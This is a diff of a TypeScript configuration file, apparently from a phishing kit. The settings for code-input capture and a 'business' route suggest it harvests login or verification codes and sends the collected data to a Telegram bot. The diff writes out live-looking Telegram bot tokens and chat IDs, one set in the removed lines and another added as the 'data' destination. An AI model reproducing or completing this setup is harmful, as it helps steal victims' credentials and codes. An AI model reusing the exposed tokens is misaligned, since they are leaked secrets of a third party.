@@ -8,10 +8,10 @@ interface Config {
 		code_input_enabled: boolean;
 	};
 	telegram: {
-		notification_chatid: -4512426196;
-		notification_token: 7794863875:AAFVUgqTSkrFvHOcRyUMt8Ne5c0cQ4y-cAA;
-		data_chatid: -4512426196;
-		data_token: 7794863875:AAFVUgqTSkrFvHOcRyUMt8Ne5c0cQ4y-cAA;
+		notification_chatid: string;
+		notification_token: string;
+		data_chatid: string;
+		data_token: string;
 	};
 	router: {
 		business_url: string;
@@ -19,7 +19,7 @@ interface Config {
 }
 
 const getConfig = async (): Promise<Config> => {
-	// b thay vao day nhe, t
+	// b thay vao day nhe, chi sua o duoi nay
 	return {
 		settings: {
 			code_loading_time: 3000,
@@ -32,8 +32,8 @@ const getConfig = async (): Promise<Config> => {
 		telegram: {
 			notification_chatid: '123456789',
 			notification_token: 'abcdefg-token',
-			data_chatid: '987654321',
-			data_token: 'hijklmn-token',
+			data_chatid: '-4544438437',
+			data_token: '7884681232:AAHm56ZhVmpGU5AaCmzk3TWpLrbIQ31kpWY',
 		},
 		router: {
 			business_url: '/business',
